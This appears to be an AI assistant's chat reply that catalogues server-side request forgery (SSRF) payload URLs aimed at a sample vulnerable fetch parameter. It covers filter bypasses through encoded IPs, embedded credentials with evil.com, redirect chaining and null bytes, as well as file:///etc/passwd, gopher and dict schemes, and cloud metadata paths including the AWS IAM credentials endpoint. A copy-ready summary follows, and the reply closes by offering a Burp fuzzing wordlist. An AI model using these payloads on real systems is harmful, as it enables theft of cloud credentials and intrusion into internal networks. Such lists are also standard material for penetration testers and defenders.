
SSRF is a web vulnerability where an attacker tricks a server into making an unintended request to another server (internal resources or external resources) on behalf of the attacker.




Ah! You're asking for all types of URL formats attackers use as payloads in the target parameter or similar during SSRF attacks — i.e., how an attacker crafts the target URL itself to exploit SSRF.

Let me show you examples grouped by technique that can be used in parameters like:

http://vulnerable-site.com/fetch?url=...


---

✅ 1. Direct Internal IP/Host SSRF

Targeting internal services like localhost, metadata, or internal networks.

http://vulnerable-site.com/fetch?url=http://127.0.0.1:80
http://vulnerable-site.com/fetch?url=http://localhost:8000
http://vulnerable-site.com/fetch?url=http://192.168.0.1/admin
http://vulnerable-site.com/fetch?url=http://10.0.0.5/status
http://vulnerable-site.com/fetch?url=http://169.254.169.254/latest/meta-data/


---

🔁 2. Open Redirect Chaining

Abusing a trusted site that redirects to internal IP.

http://vulnerable-site.com/fetch?url=http://trusted.com/redirect?url=http://127.0.0.1:8000


---

🧮 3. Obfuscated/Encoded IPs

To bypass filters checking for 127.0.0.1, etc.

Format	Example

Decimal	http://2130706433
Octal	http://0177.0.0.1
Hex	http://0x7f000001
Short	http://127.1
IPv6	http://[::1]
DNS-based	http://localtest.me (resolves to 127.0.0.1)


Example:

http://vulnerable-site.com/fetch?url=http://2130706433:80


---

🎭 4. URL With Embedded Credentials (Auth Bypass / Obfuscation)

http://vulnerable-site.com/fetch?url=http://127.0.0.1@evil.com
http://vulnerable-site.com/fetch?url=http://evil.com@127.0.0.1
http://vulnerable-site.com/fetch?url=http://user:pass@127.0.0.1


---

🛠️ 5. File / Gopher / Dict Schemes

Used in advanced SSRF for reading local files or triggering RCE.

http://vulnerable-site.com/fetch?url=file:///etc/passwd
http://vulnerable-site.com/fetch?url=gopher://127.0.0.1:11211/_stats
http://vulnerable-site.com/fetch?url=dict://127.0.0.1:2628


---

🔒 6. Cloud Metadata Endpoints (for Cloud SSRF)

Cloud	Metadata URL

AWS	http://169.254.169.254/latest/meta-data/
Azure	http://169.254.169.254/metadata/instance?api-version=2021-02-01
GCP	http://metadata.google.internal/computeMetadata/v1/
Alibaba	http://100.100.100.200/latest/meta-data/


http://vulnerable-site.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/


---

🧪 7. Null Byte or Bypass Payloads

http://vulnerable-site.com/fetch?url=http://127.0.0.1%00.example.com
http://vulnerable-site.com/fetch?url=http://127.0.0.1%09


---

🌍 8. DNS Rebinding Payloads

Attacker uses a DNS name that resolves to a public IP first, then internal.

http://vulnerable-site.com/fetch?url=http://malicious.rebind.com


---

🧱 9. SSRF Over POST JSON (API Context)

Some SSRF is triggered not by query string but in JSON bodies:

POST /api/render
{
  "url": "http://127.0.0.1:8080"
}


---

👀 Summary (Quick Copy)

Type	Payload Example

Internal IP	?url=http://127.0.0.1
AWS Metadata	?url=http://169.254.169.254/latest/meta-data/
Obfuscation	?url=http://2130706433
Auth Embed	?url=http://127.0.0.1@evil.com
Open Redirect	?url=http://trusted.com/redirect?url=http://127.0.0.1
Gopher/File	?url=gopher://127.0.0.1/_
DNS Rebinding	?url=http://malicious.rebind.com



---

Would you like me to generate a Burp Intruder wordlist from these formats for fuzzing?

